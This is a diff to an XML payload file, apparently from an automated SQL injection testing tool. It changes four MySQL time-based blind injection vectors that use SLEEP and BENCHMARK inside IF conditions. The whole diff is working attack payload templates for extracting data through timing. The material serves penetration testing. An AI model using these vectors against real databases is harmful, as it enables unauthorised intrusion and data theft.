@@ -1426,7 +1426,7 @@ Formats:
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND IF(([INFERENCE]), [RANDNUM], SLEEP([SLEEPTIME]))</vector>
+        <vector>AND [RANDNUM]=IF(([INFERENCE]), SLEEP([SLEEPTIME]), [RANDNUM])</vector>
         <request>
             <payload>AND SLEEP([SLEEPTIME])</payload>
         </request>
@@ -1446,7 +1446,7 @@ Formats:
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND IF(([INFERENCE]), [RANDNUM], BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')))</vector>
+        <vector>AND [RANDNUM]=IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')), [RANDNUM])</vector>
         <request>
             <payload>AND BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'))</payload>
         </request>
@@ -1585,7 +1585,8 @@ Formats:
         <risk>3</risk>
         <clause>1,2,3</clause>
         <where>2</where>
-        <vector>OR IF(([INFERENCE]), [RANDNUM], SLEEP([SLEEPTIME]))</vector>
+        <!-- NOTE: =0 needs to stay or else MySQL goes nunners -->
+        <vector>OR IF(([INFERENCE]), SLEEP([SLEEPTIME]), [RANDNUM])=0</vector>
         <request>
             <payload>OR SLEEP([SLEEPTIME])=0</payload>
         </request>
@@ -1605,7 +1606,7 @@ Formats:
         <risk>3</risk>
         <clause>1,2,3</clause>
         <where>2</where>
-        <vector>OR IF(([INFERENCE]), [RANDNUM], BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')))</vector>
+        <vector>OR [RANDNUM]=IF(([INFERENCE]), BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]')), [RANDNUM])</vector>
         <request>
             <payload>OR BENCHMARK([SLEEPTIME]000000, MD5('[SLEEPTIME]'))</payload>
         </request>
